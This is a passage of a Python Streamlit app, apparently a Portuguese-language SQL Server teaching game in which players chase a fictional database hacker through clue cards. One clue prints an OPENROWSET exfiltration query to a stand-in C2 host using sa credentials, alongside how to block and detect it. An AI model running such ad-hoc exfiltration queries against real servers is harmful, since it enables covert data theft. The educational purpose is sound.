                            "🔍 **Pista:** Destino: `berlin-srv01` — localização confirmada!"
                        ),
                        "learns_fact": "hobby", "fact_value": "Criar loops infinitos",
                    },
                    {
                        "id": "ber_s2", "level": "senior", "icon": "🌀",
                        "title": "OPENROWSET para Conexão Ad-hoc",
                        "short": "Exfiltração sem Linked Server — mais difícil de detectar",
                        "narrative": "Query com OPENROWSET encontrada no histórico de execução:",
                        "sql": (
                            "-- Exfiltração via OPENROWSET — sem Linked Server!\n"
                            "SELECT * FROM OPENROWSET(\n"
                            "  'SQLNCLI',\n"
                            "  'Server=berlin-c2.darknet;UID=sa;PWD=h4ck3r;',\n"
                            "  'SELECT @@VERSION'\n"
                            ")\n"
                            "-- Conexão ad-hoc — não fica em sys.servers!"
                        ),
                        "explanation": (
                            "**OPENROWSET — conexão ad-hoc entre servidores**\n\n"
                            "`OPENROWSET` conecta a fontes externas sem Linked Server permanente. "
                            "Não deixa registro em `sys.servers` — mais difícil de detectar.\n\n"
                            "**Para bloquear:** `sp_configure 'Ad Hoc Distributed Queries', 0`\n\n"
                            "**Detectar:** Extended Events monitorando `OPENROWSET`.\n\n"
                            "🔍 **Pista:** `berlin-c2.darknet` resolve para IP em Kreuzberg."
                        ),
                        "learns_fact": "sign", "fact_value": "Escorpião",
                    },
                    {
                        "id": "ber_s3", "level": "senior", "icon": "🚨",
                        "title": "fn_dblog — Forensics do Transaction Log",
                        "short": "Leitura do log de transações reconstrói todas as ações do atacante",
                        "narrative": "O perito forense usou esta query para reconstruir o ataque completo:",
                        "sql": (
                            "-- Forensics do transaction log!\n"
                            "SELECT [Current LSN], Operation,\n"
                            "       [Transaction Name], [Begin Time]\n"
                            "FROM fn_dblog(NULL, NULL)\n"
                            "WHERE Operation IN\n"
                            "      ('LOP_INSERT_ROWS','LOP_DELETE_ROWS')\n"
                            "ORDER BY [Begin Time] DESC\n"
                            "-- Reconstrói CADA ação do atacante!"
                        ),
                        "explanation": (
                            "**fn_dblog — o detetive do transaction log**\n\n"
                            "`sys.fn_dblog` lê o transaction log ativo, permitindo reconstruir "
                            "**cada operação** realizada, mesmo após rollback.\n\n"
                            "É a ferramenta mais poderosa de forensics do SQL Server — desde que "
                            "o log não tenha sido sobrescrito.\n\n"
                            "Para logs de backups anteriores: use `sys.fn_dump_dblog`.\n\n"
                            "🎯 **Caso completo! PRENDA O SUSPEITO!**"
                        ),
                        "learns_fact": "accent", "fact_value": "Binário com sotaque inglês",
                    },
                ],
                "travel_options": [],
                "is_final": True,
            },
        ],
    }
]

# ═══════════════════════════════════════════════════
# PLAYER STORE
# ═══════════════════════════════════════════════════
from datetime import datetime

SAVE_FILE = "players_progress.txt"


def _now() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


# ─────────────────────────────────────────────────────────
# LOW-LEVEL: ler e escrever o arquivo
# ─────────────────────────────────────────────────────────

def _load_all() -> dict:
    """Carrega todos os jogadores do arquivo. Retorna dict {nome_lower: record}."""
    records = {}
    if not os.path.exists(SAVE_FILE):
        return records
    with open(SAVE_FILE, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                record = json.loads(line)
                key = record["name"].lower()
                # mantém o registro mais recente por nome
                records[key] = record
            except (json.JSONDecodeError, KeyError):
                continue
    return records


def _save_all(records: dict) -> None:
    """Reescreve o arquivo com todos os registros."""
    with open(SAVE_FILE, "w", encoding="utf-8") as f:
        for record in records.values():
            f.write(json.dumps(record, ensure_ascii=False) + "\n")


# ─────────────────────────────────────────────────────────
# PUBLIC API
# ─────────────────────────────────────────────────────────

def player_exists(name: str) -> bool:
    records = _load_all()
    return name.lower() in records


def create_player(name: str, level: str) -> dict:
    """Cria novo jogador e salva. Retorna o record criado."""
    records = _load_all()
    record = {
        "name": name,
        "level": level,
        "created_at": _now(),
        "last_seen": _now(),
        "games_played": 0,
        "games_won": 0,
        "total_score": 0,
        "best_score": 0,
        "clues_collected": 0,
        "wrong_travels": 0,
        "history": [],          # lista de partidas encerradas
    }
    records[name.lower()] = record
    _save_all(records)
    return record


def load_player(name: str) -> dict | None:
    records = _load_all()
    return records.get(name.lower())


def save_player(record: dict) -> None:
    """Atualiza (upsert) o registro de um jogador."""
    records = _load_all()
    record["last_seen"] = _now()
    records[record["name"].lower()] = record
    _save_all(records)


def record_game_result(
    name: str,
    won: bool,
    score: int,
    level: str,
    clues: int,
    wrong_travels: int,
    location_reached: str,
) -> None:
    """Registra o resultado de uma partida no histórico do jogador."""
    records = _load_all()
    key = name.lower()
    if key not in records:
        return

    rec = records[key]
    rec["games_played"] += 1
    rec["clues_collected"] += clues
    rec["wrong_travels"] += wrong_travels
    rec["total_score"] += score
    rec["last_seen"] = _now()

    if won:
        rec["games_won"] += 1

    if score > rec["best_score"]:
        rec["best_score"] = score

    # histórico compacto (mantém últimos 20)
    entry = {
        "date": _now(),
        "level": level,
        "won": won,
        "score": score,
        "clues": clues,
        "wrong_travels": wrong_travels,
        "location_reached": location_reached,
    }
    rec.setdefault("history", []).append(entry)
    rec["history"] = rec["history"][-20:]  # últimas 20 partidas

    records[key] = rec
    _save_all(records)


def list_all_players() -> list[dict]:
    """Retorna todos os jogadores ordenados por melhor pontuação."""
    records = _load_all()
    players = list(records.values())
    players.sort(key=lambda p: p.get("best_score", 0), reverse=True)
    return players


def format_player_card(rec: dict) -> str:
    """Retorna uma string legível do perfil do jogador."""
    win_rate = 0
    if rec.get("games_played", 0) > 0:
        win_rate = int(rec["games_won"] / rec["games_played"] * 100)

    lines = [
        f"╔══════════════════════════════════════╗",
        f"  DETETIVE: {rec['name'].upper()}",
        f"  Nível:    {rec['level']}",
        f"  Desde:    {rec.get('created_at', '—')}",
        f"  Último:   {rec.get('last_seen', '—')}",
        f"──────────────────────────────────────",
        f"  Partidas jogadas : {rec.get('games_played', 0)}",
        f"  Vitórias         : {rec.get('games_won', 0)} ({win_rate}%)",
        f"  Melhor pontuação : {rec.get('best_score', 0)}",
        f"  Total de pontos  : {rec.get('total_score', 0)}",
        f"  Pistas coletadas : {rec.get('clues_collected', 0)}",
        f"  Viagens erradas  : {rec.get('wrong_travels', 0)}",
        f"╚══════════════════════════════════════╝",
    ]
    return "\n".join(lines)


"""
SQL Detective — Streamlit App
Onde no Mundo está o Hacker das Queries?
"""

# ═══════════════════════════════════════════════════
# APP
# ═══════════════════════════════════════════════════

# ─────────────────────────────────────────────
# PAGE CONFIG
# ─────────────────────────────────────────────

# ─────────────────────────────────────────────
# CSS
# ─────────────────────────────────────────────
st.markdown("""
<style>
@import url('https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,700;1,400&family=Special+Elite&family=Courier+Prime:wght@400;700&display=swap');

html, body, [data-testid="stAppViewContainer"] {
    background: linear-gradient(135deg, #1a0800 0%, #0d1a2e 100%) !important;
    color: #f5ead0;
    font-family: 'Courier Prime', monospace;
}
[data-testid="stAppViewContainer"] > .main { background: transparent !important; }
[data-testid="block-container"] { padding-top: 1rem !important; }
#MainMenu, footer, header { visibility: hidden; }
[data-testid="stDecoration"] { display: none; }

[data-testid="stSidebar"] {
    background: rgba(0,0,0,0.85) !important;
    border-right: 1px solid rgba(184,134,11,0.3);
}

/* ── HUD ── */
.hud-bar {
    background: rgba(0,0,0,0.85);
    border: 1px solid rgba(184,134,11,0.4);
    border-radius: 4px;
    padding: 0.6rem 1.2rem;
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 1rem;
    flex-wrap: wrap;
    gap: 0.5rem;
}
.hud-stat { color: #999; font-size: 0.85rem; }
.hud-stat span { color: #b8860b; font-weight: 700; }
.hud-lives { font-size: 1rem; letter-spacing: 0.1em; }

/* ── SECTION TITLE ── */
.section-title {
    font-family: 'Special Elite', cursive;
    color: #c0392b;
    font-size: 0.75rem;
    letter-spacing: 0.3em;
    text-transform: uppercase;
    margin: 1rem 0 0.6rem 0;
    padding-bottom: 0.4rem;
    border-bottom: 1px solid rgba(192,57,43,0.3);
}

/* ── SCENE BOX ── */
.scene-box {
    background: rgba(245,234,208,0.04);
    border: 1px solid rgba(184,134,11,0.25);
    border-radius: 4px;
    padding: 1.2rem 1.4rem;
    margin-bottom: 1rem;
    font-style: italic;
    color: #e8d5a3;
    line-height: 1.8;
}

/* ── SQL BLOCK ── */
.sql-block {
    background: #0d0d0d;
    border: 1px solid #2a2a2a;
    border-radius: 4px;
    padding: 1rem;
    font-family: 'Courier Prime', monospace;
    font-size: 0.85rem;
    color: #7ec8e3;
    line-height: 1.7;
    overflow-x: auto;
    margin: 0.8rem 0;
    white-space: pre;
}

/* ── EXPLANATION ── */
.explanation-box {
    background: rgba(45,106,79,0.1);
    border: 1px solid rgba(45,106,79,0.3);
    border-radius: 4px;
    padding: 1rem;
    margin-top: 0.8rem;
    color: #a8d8b9;
    font-size: 0.9rem;
    line-height: 1.7;
}

/* ── SUSPECT CARD ── */
.suspect-card {
    background: rgba(245,234,208,0.03);
    border: 1px solid rgba(245,234,208,0.1);
    border-radius: 4px;
    padding: 1rem;
    text-align: center;
}
.suspect-icon  { font-size: 3.5rem; margin-bottom: 0.3rem; }
.suspect-name  { font-family: 'Playfair Display', serif; color: #f5ead0; font-size: 1.1rem; }
.suspect-alias { color: #c0392b; font-size: 0.8rem; letter-spacing: 0.15em; margin-bottom: 0.8rem; }
.suspect-row   { display: flex; justify-content: space-between; padding: 0.3rem 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.82rem; }
.suspect-label { color: #555; }
.suspect-value { color: #e8d5a3; }

/* ── PROGRESS BAR ── */
.certainty-bar-outer { background: #111; height: 5px; border-radius: 3px; margin: 0.4rem 0 0.2rem; overflow: hidden; }
.certainty-bar-inner { height: 100%; background: linear-gradient(to right, #b8860b, #c0392b); border-radius: 3px; }
.certainty-label     { font-size: 0.72rem; color: #555; display: flex; justify-content: space-between; }

/* ── LEVEL BADGE ── */
.level-badge {
    display: inline-block;
    padding: 0.2rem 0.7rem;
    border-radius: 20px;
    font-size: 0.75rem;
    font-weight: 700;
    letter-spacing: 0.1em;
}
.badge-junior { background: rgba(46,125,50,0.25);  border: 1px solid #2e7d32; color: #81c784; }
.badge-pleno  { background: rgba(245,127,23,0.2);  border: 1px solid #f57f17; color: #ffca28; }
.badge-senior { background: rgba(183,28,28,0.25);  border: 1px solid #b71c1c; color: #ef9a9a; }

/* ── PLAYER CARD INTRO ── */
.player-welcome {
    background: rgba(184,134,11,0.06);
    border: 1px solid rgba(184,134,11,0.2);
    border-radius: 6px;
    padding: 1rem 1.4rem;
    margin-bottom: 1rem;
    font-size: 0.9rem;
    color: #e8d5a3;
}

/* ── LOC HEADER ── */
.loc-header { display: flex; align-items: center; gap: 1rem; margin-bottom: 1rem; }
.loc-icon   { font-size: 2.8rem; }
.loc-name   { font-family: 'Playfair Display', serif; font-size: 1.8rem; color: #f5ead0; }
.loc-country{ color: #888; font-size: 0.8rem; letter-spacing: 0.2em; text-transform: uppercase; }

/* ── BUTTONS ── */
.stButton > button {
    font-family: 'Special Elite', cursive !important;
    letter-spacing: 0.1em !important;
    text-transform: uppercase !important;
    border-radius: 2px !important;
}

/* ── EXPANDER ── */
[data-testid="stExpander"] {
    background: rgba(245,234,208,0.04) !important;
    border: 1px solid rgba(245,234,208,0.1) !important;
    border-left: 3px solid #b8860b !important;
    border-radius: 2px !important;
    margin-bottom: 0.5rem !important;
}

/* ── METRICS ── */
[data-testid="metric-container"] {
    background: rgba(0,0,0,0.3);
    border: 1px solid rgba(184,134,11,0.2);
    border-radius: 4px;
    padding: 0.5rem !important;
}
[data-testid="stMetricValue"] { color: #b8860b !important; font-family: 'Special Elite', cursive !important; }
[data-testid="stMetricLabel"] { color: #666 !important; font-size: 0.75rem !important; }

hr { border-color: rgba(184,134,11,0.2) !important; }
::-webkit-scrollbar { width: 5px; height: 5px; }
::-webkit-scrollbar-track { background: #111; }
::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }

/* ── LEVEL SELECTOR CARDS ── */
.level-card {
    border: 2px solid transparent;
    border-radius: 6px;
    padding: 1.2rem;
    cursor: pointer;
    text-align: center;
    transition: all 0.2s;
}
.level-card:hover { transform: translateY(-2px); }
.level-card-jr  { background: rgba(46,125,50,0.1);  border-color: rgba(46,125,50,0.4); }
.level-card-pl  { background: rgba(245,127,23,0.1); border-color: rgba(245,127,23,0.4); }
.level-card-sr  { background: rgba(183,28,28,0.1);  border-color: rgba(183,28,28,0.4); }
.level-card-title { font-family: 'Special Elite', cursive; font-size: 1.1rem; margin-bottom: 0.3rem; }
.level-card-desc  { font-size: 0.8rem; color: #888; line-height: 1.5; }
</style>
""", unsafe_allow_html=True)


# ─────────────────────────────────────────────
# SESSION STATE
# ─────────────────────────────────────────────
def init_state():
    defaults = {
        "screen":           "intro",   # intro | register | game | win | lose
        "player_name":      "",
        "player_level":     "",
        "case_idx":         0,
        "location_id":      "sp",
        "collected_clues":  set(),
        "learned_facts":    set(),
        "active_clues":     {},        # {loc_id: [clue, ...]} — 3 pistas sorteadas por local
        "lives":            3,
        "score":            0,
        "locations_visited":1,
        "wrong_travel":     None,
    }
    for k, v in defaults.items():
        if k not in st.session_state:
            st.session_state[k] = v

init_state()


# ─────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────
def current_case():
    return CASES[st.session_state.case_idx]

def current_location():
    for loc in current_case()["locations"]:
        if loc["id"] == st.session_state.location_id:
            return loc
    return current_case()["locations"][0]

def total_clues():
    return sum(len(get_active_clues(loc["id"])) for loc in current_case()["locations"])

def lives_display():
    n = st.session_state.lives
    return "❤️ " * n + "🖤 " * (3 - n)

def certainty_pct():
    return min(100, int(len(st.session_state.learned_facts) / 4 * 100))

def level_css_class():
    return {"junior": "badge-junior", "pleno": "badge-pleno", "senior": "badge-senior"}.get(
        st.session_state.player_level, "badge-junior"
    )

def villain_fact(field):
    v = current_case()["villain"]
    return v[field] if field in st.session_state.learned_facts else "???"

def get_active_clues(loc_id: str) -> list:
    """Retorna (e inicializa se necessário) as 3 pistas sorteadas para esta localização."""
    if loc_id not in st.session_state.active_clues:
        level = st.session_state.player_level
        loc = next(l for l in current_case()["locations"] if l["id"] == loc_id)
        pool = [c for c in loc["clues"] if c["level"] == level]
        # fallback: se nível não tiver 3 pistas, completa com outros níveis
        if len(pool) < 3:
            extras = [c for c in loc["clues"] if c["level"] != level]
            random.shuffle(extras)
            pool = pool + extras[: 3 - len(pool)]
        random.shuffle(pool)
        st.session_state.active_clues[loc_id] = pool[:3]
    return st.session_state.active_clues[loc_id]

def collect_clue(clue_id, learns_fact, points=150):
    if clue_id not in st.session_state.collected_clues:
        st.session_state.collected_clues.add(clue_id)
        st.session_state.score += points
        if learns_fact:
            st.session_state.learned_facts.add(learns_fact)
        return True
    return False

def finish_game(won: bool):
    """Registra resultado e muda de tela."""
    loc = current_location()
    record_game_result(
        name=st.session_state.player_name,
        won=won,
        score=st.session_state.score,
        level=st.session_state.player_level,
        clues=len(st.session_state.collected_clues),
        wrong_travels=3 - st.session_state.lives,
        location_reached=loc["name"],
    )
    st.session_state.screen = "win" if won else "lose"


# ─────────────────────────────────────────────
# SCREENS
# ─────────────────────────────────────────────

# ── 1. INTRO ──────────────────────────────────
def render_intro():
    st.markdown("""
    <div style="text-align:center; padding: 3rem 1rem 1rem;">
        <div style="font-family:'Special Elite',cursive; color:#666; font-size:0.8rem;
                    letter-spacing:0.4em; text-transform:uppercase; margin-bottom:1rem;">
            Divisão de Crimes Cibernéticos — Interpol SQL
        </div>
        <div style="font-family:'Playfair Display',serif; color:#b8860b; font-size:clamp(1.8rem,5vw,3rem);
                    text-shadow: 0 0 40px rgba(184,134,11,0.4); line-height:1.2; margin-bottom:0.5rem;">
            Onde no Mundo está o<br><em style="color:#c0392b">Hacker das Queries?</em>
        </div>
        <div style="font-size:5rem; margin: 1.5rem 0;
                    filter: drop-shadow(0 0 20px rgba(192,57,43,0.5));">🕵️‍♀️</div>
        <div style="color:#777; font-size:1rem; max-width:500px; margin:0 auto 2rem;
                    font-style:italic; line-height:1.8;">
            O criminoso mais procurado do submundo digital roubou dados de 42 bancos de dados
            ao redor do mundo usando técnicas avançadas de SQL Server.
            Siga as pistas, aprenda SQL e capture o culpado.
        </div>
    </div>
    """, unsafe_allow_html=True)

    c1, c2, c3 = st.columns([2, 1, 2])
    with c2:
        if st.button("▶  COMEÇAR", use_container_width=True, type="primary"):
            st.session_state.screen = "register"
            st.rerun()

    # Placar global (se existir)
    players = list_all_players()
    if players:
        st.divider()
        st.markdown('<div class="section-title">🏆 Hall da Fama</div>', unsafe_allow_html=True)
        cols = st.columns(min(len(players), 5))
        for i, p in enumerate(players[:5]):
            with cols[i]:
                badge_cls = {"junior": "badge-junior", "pleno": "badge-pleno",
                             "senior": "badge-senior"}.get(p.get("level",""), "badge-junior")
                st.markdown(f"""
                <div style="text-align:center; padding:0.5rem;
                            background:rgba(184,134,11,0.05);
                            border:1px solid rgba(184,134,11,0.15); border-radius:4px;">
                    <div style="font-size:1.5rem;">{'🥇🥈🥉🎖️🎖️'[i]}</div>
                    <div style="color:#f5ead0; font-size:0.9rem; font-weight:700;">{p['name']}</div>
                    <div class="level-badge {badge_cls}">{LEVEL_LABELS.get(p.get('level',''),'')}</div>
                    <div style="color:#b8860b; font-size:1rem; margin-top:0.3rem;">{p.get('best_score',0)} pts</div>
                    <div style="color:#555; font-size:0.72rem;">{p.get('games_won',0)}W / {p.get('games_played',0)}J</div>
                </div>
                """, unsafe_allow_html=True)


# ── 2. REGISTER ───────────────────────────────
def render_register():
    st.markdown("""
    <div style="text-align:center; padding: 2rem 1rem 0.5rem;">
        <div style="font-family:'Playfair Display',serif; color:#b8860b; font-size:2rem;
                    margin-bottom:0.3rem;">Identificação do Detetive</div>
        <div style="color:#666; font-size:0.85rem; letter-spacing:0.2em; text-transform:uppercase;">
            Interpol SQL — Credenciais de Acesso
        </div>
    </div>
    """, unsafe_allow_html=True)

    st.divider()

    # ── Nome ──
    c1, c2, c3 = st.columns([1, 2, 1])
    with c2:
        st.markdown("""
        <div style="font-family:'Special Elite',cursive; color:#c0392b; font-size:0.75rem;
                    letter-spacing:0.3em; text-transform:uppercase; margin-bottom:0.4rem;">
            Qual é o seu nome, Detetive?
        </div>
        """, unsafe_allow_html=True)

        name_input = st.text_input(
            label="nome",
            label_visibility="collapsed",
            placeholder="Digite seu codinome de agente...",
            max_chars=30,
            key="name_input_field",
        )

        existing_player = None
        if name_input.strip():
            existing_player = load_player(name_input.strip())
            if existing_player:
                st.info(f"👋 Bem-vindo de volta, **{existing_player['name']}**! "
                        f"Melhor pontuação: **{existing_player.get('best_score', 0)}** pts | "
                        f"Nível: **{LEVEL_LABELS.get(existing_player.get('level',''), '')}**")

    st.markdown("<br>", unsafe_allow_html=True)

    # ── Nível ──
    st.markdown("""
    <div style="text-align:center; font-family:'Special Elite',cursive; color:#c0392b;
                font-size:0.75rem; letter-spacing:0.3em; text-transform:uppercase; margin-bottom:1rem;">
        Escolha seu nível de investigação
    </div>
    """, unsafe_allow_html=True)

    lc1, lc2, lc3 = st.columns(3, gap="medium")

    with lc1:
        st.markdown("""
        <div class="level-card level-card-jr">
            <div style="font-size:2.5rem; margin-bottom:0.5rem;">🟢</div>
            <div class="level-card-title" style="color:#81c784;">JÚNIOR</div>
            <div class="level-card-desc">
                Conceitos básicos de SQL Server.<br>
                SELECT, INSERT, UPDATE, DELETE,<br>
                tipos de dados e erros comuns.
            </div>
        </div>
        """, unsafe_allow_html=True)
        btn_jr = st.button("Selecionar Júnior", key="lvl_jr", use_container_width=True)

    with lc2:
        st.markdown("""
        <div class="level-card level-card-pl">
            <div style="font-size:2.5rem; margin-bottom:0.5rem;">🟡</div>
            <div class="level-card-title" style="color:#ffca28;">PLENO</div>
            <div class="level-card-desc">
                Nível intermediário.<br>
                JOINs, subqueries, índices,<br>
                transactions e performance.
            </div>
        </div>
        """, unsafe_allow_html=True)
        btn_pl = st.button("Selecionar Pleno", key="lvl_pl", use_container_width=True)

    with lc3:
        st.markdown("""
        <div class="level-card level-card-sr">
            <div style="font-size:2.5rem; margin-bottom:0.5rem;">🔴</div>
            <div class="level-card-title" style="color:#ef9a9a;">SÊNIOR</div>
            <div class="level-card-desc">
                Nível avançado.<br>
                DMVs, Extended Events, criptografia,<br>
                forensics e segurança avançada.
            </div>
        </div>
        """, unsafe_allow_html=True)
        btn_sr = st.button("Selecionar Sênior", key="lvl_sr", use_container_width=True)

    # ── Processar seleção ──
    chosen_level = None
    if btn_jr: chosen_level = "junior"
    if btn_pl: chosen_level = "pleno"
    if btn_sr: chosen_level = "senior"

    if chosen_level:
        name = name_input.strip()
        if not name:
            st.error("⚠️ Digite seu nome antes de escolher o nível!")
        else:
            st.session_state.player_name  = name
            st.session_state.player_level = chosen_level

            # criar ou atualizar jogador
            if not player_exists(name):
                create_player(name, chosen_level)
            else:
                rec = load_player(name)
                rec["level"] = chosen_level   # atualiza nível
                save_player(rec)

            # iniciar jogo
            st.session_state.screen           = "game"
            st.session_state.location_id      = "sp"
            st.session_state.collected_clues  = set()
            st.session_state.learned_facts    = set()
            st.session_state.active_clues     = {}
            st.session_state.lives            = 3
            st.session_state.score            = 0
            st.session_state.locations_visited= 1
            st.session_state.wrong_travel     = None
            st.rerun()

    # Botão voltar
    st.markdown("<br>", unsafe_allow_html=True)
    c1, c2, c3 = st.columns([2, 1, 2])
    with c2:
        if st.button("← Voltar", use_container_width=True):
            st.session_state.screen = "intro"
            st.rerun()


# ── 3. GAME HUD ───────────────────────────────
def render_hud():
    level_label = LEVEL_LABELS.get(st.session_state.player_level, "")
    badge_cls = level_css_class()
    n_col = len(st.session_state.collected_clues)
    n_tot = total_clues()

    st.markdown(f"""
    <div class="hud-bar">
        <span class="hud-stat">🔍 <strong style="color:#b8860b">{st.session_state.player_name}</strong>
            &nbsp;<span class="level-badge {badge_cls}">{level_label}</span>
        </span>
        <span class="hud-stat">CASO: <span>{current_case()['id']}</span></span>
        <span class="hud-stat">PISTAS: <span>{n_col}/{n_tot}</span></span>
        <span class="hud-stat">LOCAIS: <span>{st.session_state.locations_visited}</span></span>
        <span class="hud-stat">PONTOS: <span>{st.session_state.score}</span></span>
        <span class="hud-lives">{lives_display()}</span>
    </div>
    """, unsafe_allow_html=True)


# ── 4. GAME ───────────────────────────────────
def render_game():
    render_hud()

    loc     = current_location()
    villain = current_case()["villain"]
    clues   = get_active_clues(loc["id"])   # 3 pistas sorteadas para este local/nível

    left, right = st.columns([3, 1.3], gap="medium")

    # ═══ LEFT ═══
    with left:
        # Location header
        st.markdown(f"""
        <div class="loc-header">
            <div class="loc-icon">{loc['icon']}</div>
            <div>
                <div class="loc-name">{loc['flag']} {loc['name']}</div>
                <div class="loc-country">{loc['country']} — Investigando</div>
            </div>
        </div>
        """, unsafe_allow_html=True)

        # Welcome / narrative
        st.markdown(f'<div class="scene-box">{loc["narrative"]}</div>', unsafe_allow_html=True)

        # ── CLUES ──
        st.markdown('<div class="section-title">📁 Pistas Disponíveis</div>', unsafe_allow_html=True)

        for clue in clues:
            collected = clue["id"] in st.session_state.collected_clues
            badge = "✅ " if collected else "🔒 "
            label = f"{clue['icon']} {badge}{clue['title']}"

            with st.expander(label, expanded=False):
                st.markdown(f"*{clue['narrative']}*")
                st.markdown(f'<div class="sql-block">{clue["sql"]}</div>', unsafe_allow_html=True)
                st.markdown(f'<div class="explanation-box">{clue["explanation"]}</div>',
                            unsafe_allow_html=True)

                if not collected:
                    if st.button("🔍 Coletar esta pista", key=f"btn_{clue['id']}"):
                        collect_clue(clue["id"], clue.get("learns_fact"))
                        st.success("✅ Pista coletada! +150 pontos")
                        st.rerun()
                else:
                    st.success("✅ Pista já coletada.")

        # ── TRAVEL / ARREST ──
        loc_collected  = sum(1 for c in clues if c["id"] in st.session_state.collected_clues)
        all_clues_here = loc_collected == len(clues)

        if not loc["is_final"]:
            st.markdown('<div class="section-title">✈️ Viajar para...</div>', unsafe_allow_html=True)

            if not all_clues_here:
                st.warning(f"⚠️ Colete as {len(clues)} pistas deste local antes de viajar. "
                           f"({loc_collected}/{len(clues)})")
            else:
                for opt in loc["travel_options"]:
                    ca, cb = st.columns([4, 1])
                    with ca:
                        st.markdown(f"**{opt['flag']} {opt['name']}** — *{opt['hint']}*")
                    with cb:
                        if st.button("✈️ Ir", key=f"travel_{opt['dest']}"):
                            if opt["correct"]:
                                st.session_state.score            += 300
                                st.session_state.locations_visited += 1
                                st.session_state.location_id       = opt["dest"]
                                st.session_state.wrong_travel      = None
                                st.success(f"✈️ Viajando para {opt['name']}! +300 pontos")
                                st.rerun()
                            else:
                                st.session_state.lives      -= 1
                                st.session_state.score       = max(0, st.session_state.score - 200)
                                st.session_state.wrong_travel= opt["name"]
                                if st.session_state.lives <= 0:
                                    finish_game(won=False)
                                st.rerun()

                if st.session_state.wrong_travel:
                    st.error(f"❌ Pista falsa! {st.session_state.wrong_travel} não era o destino certo. "
                             f"-200 pontos e uma vida perdida!")
        else:
            st.markdown('<div class="section-title">⚖️ Mandado de Prisão</div>', unsafe_allow_html=True)
            if all_clues_here:
                st.success("🎯 Todas as evidências coletadas! Você pode efetuar a prisão.")
                if st.button("🚨  EFETUAR PRISÃO", type="primary", use_container_width=True):
                    bonus = st.session_state.lives * 500 + len(st.session_state.collected_clues) * 50 + 1000
                    st.session_state.score += bonus
                    finish_game(won=True)
                    st.rerun()
            else:
                st.warning(f"Colete as {len(clues)} pistas deste local para emitir o mandado. "
                           f"({loc_collected}/{len(clues)})")

    # ═══ RIGHT ═══
    with right:
        # Suspect
        st.markdown('<div class="section-title">🗃️ Dossiê do Suspeito</div>', unsafe_allow_html=True)
        st.markdown(f"""
        <div class="suspect-card">
            <div class="suspect-icon">{villain['icon']}</div>
            <div class="suspect-name">{villain['name']}</div>
            <div class="suspect-alias">alias: {villain['alias']}</div>
            <div class="suspect-row">
                <span class="suspect-label">Especialidade</span>
                <span class="suspect-value">{villain['spec']}</span>
            </div>
            <div class="suspect-row">
                <span class="suspect-label">Drink fav.</span>
                <span class="suspect-value">{villain_fact('drink')}</span>
            </div>
            <div class="suspect-row">
                <span class="suspect-label">Sotaque</span>
                <span class="suspect-value">{villain_fact('accent')}</span>
            </div>
            <div class="suspect-row">
                <span class="suspect-label">Hobby</span>
                <span class="suspect-value">{villain_fact('hobby')}</span>
            </div>
            <div class="suspect-row" style="border:none;">
                <span class="suspect-label">Signo</span>
                <span class="suspect-value">{villain_fact('sign')}</span>
            </div>
        </div>
        """, unsafe_allow_html=True)

        pct = certainty_pct()
        st.markdown(f"""
        <div style="margin-top:0.8rem;">
            <div class="certainty-label">
                <span>Certeza</span><span style="color:#b8860b">{pct}%</span>
            </div>
            <div class="certainty-bar-outer">
                <div class="certainty-bar-inner" style="width:{pct}%"></div>
            </div>
        </div>
        """, unsafe_allow_html=True)

        st.divider()
        st.metric("🏆 Pontos",  st.session_state.score)
        st.metric("📍 Locais",  st.session_state.locations_visited)
        st.metric("🔍 Pistas",  f"{len(st.session_state.collected_clues)}/{total_clues()}")

        st.divider()

        # Histórico do jogador
        rec = load_player(st.session_state.player_name)
        if rec and rec.get("games_played", 0) > 0:
            st.markdown('<div class="section-title">📋 Seu Histórico</div>', unsafe_allow_html=True)
            st.markdown(f"""
            <div style="font-size:0.8rem; color:#888; line-height:2;">
                🎮 Partidas: <strong style="color:#b8860b">{rec['games_played']}</strong><br>
                🏆 Vitórias: <strong style="color:#b8860b">{rec['games_won']}</strong><br>
                ⭐ Melhor:   <strong style="color:#b8860b">{rec['best_score']} pts</strong>
            </div>
            """, unsafe_allow_html=True)


# ── 5. WIN ────────────────────────────────────
def render_win():
    v = current_case()["villain"]
    rec = load_player(st.session_state.player_name)
    is_best = rec and st.session_state.score >= rec.get("best_score", 0)

    st.markdown(f"""
    <div style="text-align:center; padding:3rem 2rem;">
        <div style="font-size:5rem; margin-bottom:1rem;">{'🥇' if is_best else '🏆'}</div>
        <div style="font-family:'Playfair Display',serif; font-size:2.5rem;
                    color:#b8860b; margin-bottom:1rem;">
            {'NOVO RECORDE! ' if is_best else ''}CASO ENCERRADO!
        </div>
        <div style="color:#999; font-size:1rem; max-width:500px;
                    margin:0 auto 1.5rem; line-height:1.8;">
            <strong style="color:#f5ead0">{v['name']}</strong> foi capturado em Berlim.
            Excelente trabalho, Detetive <strong style="color:#f5ead0">{st.session_state.player_name}</strong>!
        </div>
        <div style="font-family:'Special Elite',cursive; color:#b8860b;
                    font-size:1.8rem; margin-bottom:2rem;">
            Pontuação: {st.session_state.score}
        </div>
    </div>
    """, unsafe_allow_html=True)

    # Histórico
    if rec and rec.get("history"):
        st.markdown('<div class="section-title" style="text-align:center;">📊 Suas Últimas Partidas</div>',
                    unsafe_allow_html=True)
        history = rec["history"][-5:][::-1]
        for entry in history:
            result_icon = "✅" if entry["won"] else "❌"
            lvl_lbl = LEVEL_LABELS.get(entry.get("level", ""), entry.get("level", ""))
            st.markdown(
                f"{result_icon} **{entry['date'][:10]}** · {lvl_lbl} · "
                f"{entry['score']} pts · pistas: {entry['clues']} · erros: {entry['wrong_travels']}"
            )

    st.markdown("<br>", unsafe_allow_html=True)
    c1, c2, c3 = st.columns([1, 2, 1])
    with c2:
        ca, cb = st.columns(2)
        with ca:
            if st.button("🔄 Novo Caso", use_container_width=True, type="primary"):
                _restart_game()
        with cb:
            if st.button("🚪 Sair", use_container_width=True):
                _full_reset()


# ── 6. LOSE ───────────────────────────────────
def render_lose():
    st.markdown(f"""
    <div style="text-align:center; padding:3rem 2rem;">
        <div style="font-size:5rem; margin-bottom:1rem;">💀</div>
        <div style="font-family:'Playfair Display',serif; font-size:2.5rem;
                    color:#c0392b; margin-bottom:1rem;">CASO FRIO</div>
